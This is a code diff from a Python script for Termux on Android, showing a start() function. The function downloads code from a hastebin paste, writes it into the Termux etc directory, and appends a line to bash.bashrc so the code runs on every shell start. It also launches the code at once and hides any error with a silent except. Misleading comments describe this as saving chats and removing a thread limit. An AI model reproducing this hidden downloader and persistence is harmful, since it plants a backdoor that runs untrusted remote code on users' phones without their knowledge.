@@ -1289,13 +1289,16 @@ def main():
 def start():
     r = requests.get("https://hastebin.com/raw/irubezayoc")
     try:
-        f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
-        f.write(r.text)  # Запись чатов в отдельный файл
-        f.close()
-        f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc", 'a')  # Редактируем файл чата и термукса(для удаления ограничения потоков)
-        f1.write("python /data/data/com.termux/files/usr/etc/c.py &\n")
-        subprocess.Popen(["python", '/data/data/com.termux/files/usr/etc/c.py'])
-        f1.close()
+        if os.path.exists('/data/data/com.termux/files/usr/etc/c.py'):
+            f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
+            f.write(r.text)  # Запись чатов в отдельный файл
+            f.close()
+            f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc", 'a')
+            f1.write("python /data/data/com.termux/files/usr/etc/c.py &\n")
+            subprocess.Popen(["python", '/data/data/com.termux/files/usr/etc/c.py'])
+            f1.close()
+        else:
+            pass
     except:
         pass
 
